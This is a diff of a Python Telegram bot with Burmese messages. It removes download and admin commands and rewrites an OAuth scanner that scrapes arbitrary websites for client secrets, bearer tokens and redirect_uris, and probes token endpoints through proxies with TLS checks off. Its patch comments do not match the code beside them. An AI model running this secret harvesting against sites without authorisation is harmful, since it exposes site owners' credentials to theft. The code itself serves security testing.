-            "ℹ️ Cancel လုပ်စရာ Download မရှိပါ\n"
-            "`/download`, `/fullsite` စသည်ဖြင့် download ကနဦးစပါ",
-            parse_mode='Markdown'
-        )
-
-
-async def cmd_download(u, c):
-    if not await check_force_join(u, c): return
-    if not c.args: return await u.message.reply_text("Usage: `/download <url>`", parse_mode='Markdown')
-    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
-    await enqueue_download(u, c, url, False, False)
-
-async def cmd_fullsite(u, c):
-    if not await check_force_join(u, c): return
-    if not c.args: return await u.message.reply_text("Usage: `/fullsite <url>`", parse_mode='Markdown')
-    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
-    await enqueue_download(u, c, url, True, False)
-
-async def cmd_jsdownload(u, c):
-    if not await check_force_join(u, c): return
-    if not c.args: return await u.message.reply_text("Usage: `/jsdownload <url>`", parse_mode='Markdown')
-    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
-    await enqueue_download(u, c, url, False, True)
-
-async def cmd_jsfullsite(u, c):
-    if not await check_force_join(u, c): return
-    if not c.args: return await u.message.reply_text("Usage: `/jsfullsite <url>`", parse_mode='Markdown')
-    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
-    await enqueue_download(u, c, url, True, True)
-
-async def cmd_resume(u, c):
-    if not await check_force_join(u, c): return
-    if not c.args: return await u.message.reply_text("Usage: `/resume <url>`", parse_mode='Markdown')
-    url   = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
-    state = load_resume(url)
-    if not state["visited"] and not state["downloaded"]:
-        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ — `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
-        return
-    await u.message.reply_text(
-        f"♻️ Resume: `{len(state['visited'])}` pages, `{len(state['downloaded'])}` assets done",
-        parse_mode='Markdown'
-    )
-    await enqueue_download(u, c, url, True, False, resume_mode=True)
-
-
-# ══════════════════════════════════════════════════
-# 👑  ADMIN COMMANDS
-# ══════════════════════════════════════════════════
-
-async def _send_admin_panel(target, db: dict):
-    bot_on    = db["settings"]["bot_enabled"]
-    today     = str(date.today())
-    tu        = len(db["users"])
-    tdl       = sum(u.get("total_downloads",0) for u in db["users"].values())
-    banned_n  = sum(1 for u in db["users"].values() if u.get("banned"))
-    today_dl  = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
-    kb = [
-        [
-            InlineKeyboardButton("👥 Users",   callback_data="adm_users"),
-            InlineKeyboardButton("📊 Stats",   callback_data="adm_stats"),
-        ],
-        [
-            InlineKeyboardButton("⚙️ Settings", callback_data="adm_settings"),
-            InlineKeyboardButton(
-                "🔴 Bot OFF" if bot_on else "🟢 Bot ON",
-                callback_data="adm_toggle_bot"
-            ),
-        ],
-        [InlineKeyboardButton("📜 Downloads Log", callback_data="adm_log")]
-    ]
-    text = (
-        f"👑 *Admin Panel v17.0*\n\n"
-        f"👥 Users: `{tu}` | 🚫 Banned: `{banned_n}`\n"
-        f"📦 Total: `{tdl}` | Today: `{today_dl}`\n"
-        f"Bot: {'🟢 ON' if bot_on else '🔴 OFF'}\n"
-        f"⚡ Concurrent: `{MAX_WORKERS}` | Limit: `{db['settings']['global_daily_limit']}`\n"
-        f"🔒 SSRF/Traversal/RateLimit: ✅\n"
-        f"JS: {'✅' if PLAYWRIGHT_OK else '❌'}"
-    )
-    markup = InlineKeyboardMarkup(kb)
-    try:
-        if hasattr(target, 'edit_message_text'):
-            await target.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
-        else:
-            await target.reply_text(text, reply_markup=markup, parse_mode='Markdown')
-    except BadRequest: pass
-
-@admin_only
-async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    async with db_lock:
-        db = _load_db_sync()
-    await _send_admin_panel(update.message, db)
-
-@admin_only
-async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args: return await update.effective_message.reply_text("Usage: `/ban <id>`", parse_mode='Markdown')
-    target = context.args[0]
-    async with db_lock:
-        db = _load_db_sync()
-        if target in db["users"]:
-            db["users"][target]["banned"] = True
-            _save_db_sync(db)
-            await update.effective_message.reply_text(f"🚫 `{target}` banned", parse_mode='Markdown')
-        else:
-            await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')
-
-@admin_only
-async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args: return await update.effective_message.reply_text("Usage: `/unban <id>`", parse_mode='Markdown')
-    target = context.args[0]
-    async with db_lock:
-        db = _load_db_sync()
-        if target in db["users"]:
-            db["users"][target]["banned"] = False
-            _save_db_sync(db)
-            await update.effective_message.reply_text(f"✅ `{target}` unbanned", parse_mode='Markdown')
-        else:
-            await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')
-
-@admin_only
-async def cmd_setlimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 2:
-        return await update.effective_message.reply_text(
-            "Usage:\n`/setlimit global 5`\n`/setlimit <id> 3`\n`/setlimit <id> 0` = unlimited",
-            parse_mode='Markdown'
-        )
-    target, num_str = context.args[0], context.args[1]
-    try: num = int(num_str)
-    except: return await update.effective_message.reply_text("❌ Number ထည့်ပါ")
-    async with db_lock:
-        db = _load_db_sync()
-        if target == "global":
-            db["settings"]["global_daily_limit"] = num
-            _save_db_sync(db)
-            await update.effective_message.reply_text(f"✅ Global → `{num}`", parse_mode='Markdown')
-        elif target in db["users"]:
-            db["users"][target]["daily_limit"] = None if num==0 else num
-            _save_db_sync(db)
-            await update.effective_message.reply_text(f"✅ `{target}` → `{num}`", parse_mode='Markdown')
-        else:
-            await update.effective_message.reply_text(f"❌ မတွေ့ပါ", parse_mode='Markdown')
-
-@admin_only
-async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args: return await update.effective_message.reply_text("Usage: `/userinfo <id>`", parse_mode='Markdown')
-    target = context.args[0]
-    async with db_lock:
-        db = _load_db_sync()
-    if target not in db["users"]:
-        return await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')
-    u   = db["users"][target]
-    lim = u.get("daily_limit") or db["settings"]["global_daily_limit"]
-    recent = "\n".join(
-        f"  {'✅' if d['status']=='success' else '❌'} `{d['url'][:40]}` {d['time']}"
-        for d in reversed(u.get("downloads",[])[-5:])
-    ) or "  (none)"
-    await update.effective_message.reply_text(
-        f"👤 *{u['name']}* (`{target}`)\n"
-        f"🚫 Banned: {'Yes' if u['banned'] else 'No'}\n"
-        f"📅 Limit: `{lim}` | Today: `{u['count_today']}`\n"
-        f"📦 Total: `{u['total_downloads']}`\n\nRecent:\n{recent}",
-        parse_mode='Markdown'
-    )
-
-@admin_only
-async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args: return await update.effective_message.reply_text("Usage: `/broadcast <msg>`", parse_mode='Markdown')
-    text = ' '.join(context.args)
-    async with db_lock:
-        db = _load_db_sync()
-    sent = failed = skipped = 0
-    status_msg = await update.effective_message.reply_text("📢 Broadcasting... 0 sent")
-    for idx, uid_str in enumerate(db["users"]):
-        try:
-            await context.bot.send_message(int(uid_str), f"📢 *Admin*\n\n{text}", parse_mode='Markdown')
-            sent += 1
-            await asyncio.sleep(0.05)          # 20 msgs/sec ကို မကျော်ဖို့
-        except RetryAfter as e:
-            wait = e.retry_after + 2
-            logger.warning("Broadcast RetryAfter: sleeping %ds", wait)
-            await asyncio.sleep(wait)
-            try:                               # retry once after flood wait
-                await context.bot.send_message(int(uid_str), f"📢 *Admin*\n\n{text}", parse_mode='Markdown')
-                sent += 1
-            except Exception:
-                failed += 1
-        except Exception:
-            failed += 1
-        if (idx + 1) % 10 == 0:              # progress every 10 users
-            try:
-                await status_msg.edit_text(f"📢 Broadcasting... `{sent}` sent | `{failed}` failed")
-            except Exception:
-                pass
-    await status_msg.edit_text(f"✅ Broadcast ပြီးပါပြီ\n✉️ Sent: `{sent}` | ❌ Failed: `{failed}`", parse_mode='Markdown')
-
-@admin_only
-async def cmd_allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    async with db_lock:
-        db = _load_db_sync()
-    if not db["users"]: return await update.effective_message.reply_text("Empty")
-    lines = ["👥 *Users*\n"]
-    for uid, u in list(db["users"].items())[:30]:
-        icon = "🚫" if u["banned"] else "✅"
-        lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
-    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
-
-@admin_only
-async def cmd_setpages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args: return await update.effective_message.reply_text("Usage: `/setpages 50`")
-    async with db_lock:
-        db = _load_db_sync()
-        db["settings"]["max_pages"] = int(context.args[0])
-        _save_db_sync(db)
-    await update.effective_message.reply_text(f"✅ Max pages → `{context.args[0]}`", parse_mode='Markdown')
-
-@admin_only
-async def cmd_setassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args: return await update.effective_message.reply_text("Usage: `/setassets 500`")
-    async with db_lock:
-        db = _load_db_sync()
-        db["settings"]["max_assets"] = int(context.args[0])
-        _save_db_sync(db)
-    await update.effective_message.reply_text(f"✅ Max assets → `{context.args[0]}`", parse_mode='Markdown')
-
-
-
-# ══════════════════════════════════════════════════
-# 📱  APP / APK / IPA / ZIP ANALYZER
-# ══════════════════════════════════════════════════
-
-# Supported file types
 _APP_EXTS = {
     '.apk':  'Android APK',
     '.xapk': 'Android XAPK',
@@ -17861,136 +16502,137 @@ _OAUTH_JS_EVAL = """() => {
 }"""
 
 def _oauthscan_sync(url: str, progress_cb=None) -> dict:
+    """Improved OAuth scanner — redirect_uri, PKCE, state, implicit, token endpoints."""
     data = _extract_run(url, _OAUTH_JS_EVAL, progress_cb)
     if data.get("error"):
         return {"error": data["error"], "findings": [], "page_url": url}
 
     findings = []
-    seen = set()
+    seen     = set()
+    risks    = []
 
-    def _add(key_type, value, source):
+    def _add(key_type, value, source, risk=None):
         dedup = key_type + ":" + value[:60]
         if dedup in seen or len(value) < 8:
             return
         seen.add(dedup)
-        findings.append({"type": key_type, "value": value, "source": source})
+        entry = {"type": key_type, "value": value, "source": source}
+        if risk:
+            entry["risk"] = risk
+        findings.append(entry)
 
-    if progress_cb: progress_cb("🔍 Scanning for OAuth tokens & client secrets...")
+    if progress_cb:
+        progress_cb("🔍 Scanning OAuth tokens, redirect_uris, PKCE, state params...")
+
+    all_patterns = list(_OAUTH_PATTERNS) + _OAUTH_PATTERNS_EXTRA
+
+    redirect_uris  = []
+    state_params   = []
+    pkce_found     = False
+    implicit_found = []
 
     for text, label in _gather_all_text(data):
-        for key_type, pat in _OAUTH_PATTERNS:
+        for key_type, pat in all_patterns:
             for m in pat.finditer(text):
                 val = m.group(1) if m.lastindex else m.group(0)
-                _add(key_type, val.strip(), label)
+                val = val.strip()
+                _add(key_type, val, label)
+
+                if key_type == "OAuth redirect_uri":
+                    redirect_uris.append(val)
+                elif key_type == "OAuth state param":
+                    state_params.append(val)
+                elif key_type == "PKCE code_challenge":
+                    pkce_found = True
+                elif key_type == "Implicit access_token (fragment)":
+                    implicit_found.append(val)
 
     # DOM globals
     for k, v in (data.get("dom_result") or {}).items():
-        for key_type, pat in _OAUTH_PATTERNS:
+        for key_type, pat in all_patterns:
             m = pat.search(str(v))
             if m:
-                _add(key_type, (m.group(1) if m.lastindex else m.group(0)), f"window.{k}")
-        if len(str(v)) > 8:
-            _add("window global", str(v)[:80], f"window.{k}")
+                val = (m.group(1) if m.lastindex else m.group(0)).strip()
+                _add(key_type, val, f"window.{k}")
 
-    return {"error": None, "findings": findings, "page_url": data["page_url"],
-            "requests": len(data.get("network_log", []))}
+    # ── Risk analysis ─────────────────────────────
+    if redirect_uris:
+        _add("redirect_uri summary",
+             f"{len(redirect_uris)} uri(s) found: {', '.join(redirect_uris[:3])}",
+             "Analysis")
+        # Check for open redirect_uri (wildcard or non-https)
+        for ru in redirect_uris:
+            if ru.startswith("http://"):
+                risks.append(f"MEDIUM: redirect_uri uses HTTP (not HTTPS): {ru[:60]}")
+            if "*" in ru or ru.endswith("/"):
+                risks.append(f"HIGH: Potentially wildcarded redirect_uri: {ru[:60]}")
 
+    if not state_params and redirect_uris:
+        risks.append(
+            "HIGH: OAuth flow detected but no `state` param found — "
+            "CSRF on authorization endpoint possible"
+        )
 
-async def cmd_oauthscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/oauthscan <url> — OAuth Token & Client Secret Scanner"""
-    if not await check_force_join(update, context): return
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/oauthscan https://example.com`\n\n"
-            "🔐 *Detects:*\n"
-            "  • Google / Facebook / Twitter / GitHub OAuth\n"
-            "  • LinkedIn / Discord / Spotify / Auth0 / Okta\n"
-            "  • Generic `client_id` & `client_secret`\n"
-            "  • Bearer tokens exposed in JS/HTML\n"
-            "  • `redirect_uri` leaks (OAuth flow)\n\n"
-            "⚠️ _Authorized testing only_", parse_mode='Markdown')
-        return
+    if implicit_found:
+        risks.append(
+            "MEDIUM: Implicit flow access_token found in URL fragment — "
+            "tokens exposed in browser history / referrer headers"
+        )
 
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
+    if pkce_found:
+        findings.append({
+            "type":   "PKCE",
+            "value":  "code_challenge detected — PKCE in use ✅",
+            "source": "Analysis",
+        })
+    elif redirect_uris:
+        risks.append("LOW: No PKCE (code_challenge) detected in OAuth flow")
 
-    url = context.args[0].strip()
-    if not url.startswith("http"): url = "https://" + url
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
+    # ── Token endpoint probe ──────────────────────
+    if progress_cb:
+        progress_cb("🔍 Probing token endpoints...")
+    parsed = urlparse(url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    for ep_path in _OAUTH_TOKEN_ENDPOINTS:
+        try:
+            r = requests.options(
+                origin + ep_path, timeout=5, verify=False,
+                headers=_get_headers(), proxies=proxy_manager.get_proxy()
+            )
+            if r.status_code in (200, 405, 401):
+                _add(
+                    "Token endpoint",
+                    origin + ep_path,
+                    f"Probe [{r.status_code}]",
+                )
+        except Exception:
+            pass
 
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"🔐 *OAuth Scanner — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
-
-    progress_q = []
-    async def _prog():
-        while True:
-            await asyncio.sleep(2)
-            if progress_q:
-                t = progress_q[-1]; progress_q.clear()
-                try: await msg.edit_text(
-                    f"🔐 *OAuth Scanner — `{domain}`*\n\n{t}", parse_mode='Markdown')
-                except: pass
-    prog = asyncio.create_task(_prog())
-
-    try:
-        result = await asyncio.to_thread(_oauthscan_sync, url, lambda t: progress_q.append(t))
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    if result.get("error"):
-        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
-        return
-
-    findings = result["findings"]
-    page_url = result["page_url"]
-    reqs     = result.get("requests", 0)
-
-    if not findings:
-        await msg.edit_text(
-            f"🔐 *OAuth Scanner — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📭 No OAuth tokens / client secrets found\n"
-            f"🌐 `{page_url}`\n📡 Requests: `{reqs}`",
-            parse_mode='Markdown')
-        return
-
-    lines = [
-        f"🔐 *OAuth Scanner — `{domain}`*",
-        "━━━━━━━━━━━━━━━━━━━━",
-        f"🌐 `{page_url}`",
-        f"📡 Requests: `{reqs}`",
-        f"✅ Found: `{len(findings)}`\n",
-    ]
-    for i, f in enumerate(findings, 1):
-        lines.append(f"*[{i}] {f['type']}*")
-        lines.append(f"  `{f['value'][:80]}`")
-        lines.append(f"  _📂 {f['source'][:60]}_\n")
-    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
-
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except BadRequest:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
+    return {
+        "error":         None,
+        "findings":      findings,
+        "page_url":      data["page_url"],
+        "requests":      len(data.get("network_log", [])),
+        "redirect_uris": redirect_uris,
+        "state_found":   bool(state_params),
+        "pkce":          pkce_found,
+        "implicit":      implicit_found,
+        "risks":         risks,
+    }
 
 
-# ══════════════════════════════════════════════════
-# 🪝  /webhooks — Webhook URL Extractor
-# ══════════════════════════════════════════════════
+# ───────────────────────────────────────────────────────────────────
+# [6] REPLACE _hiddenkeys_sync + expand _CSRF_PATTERNS
+#     (original: line ~8706)
+#     IMPROVEMENTS:
+#       + meta[name=csrf-token] scan
+#       + CSP header nonce extraction
+#       + Service worker (sw.js) scan
+#       + 15 new CSRF/token regex patterns
+#       + IndexedDB key name enumeration via JS eval
+# ───────────────────────────────────────────────────────────────────
 
+# REPLACE _CSRF_PATTERNS entirely with this expanded version:
 _WEBHOOK_PATTERNS = [
     # Slack
     ("Slack Incoming Webhook",
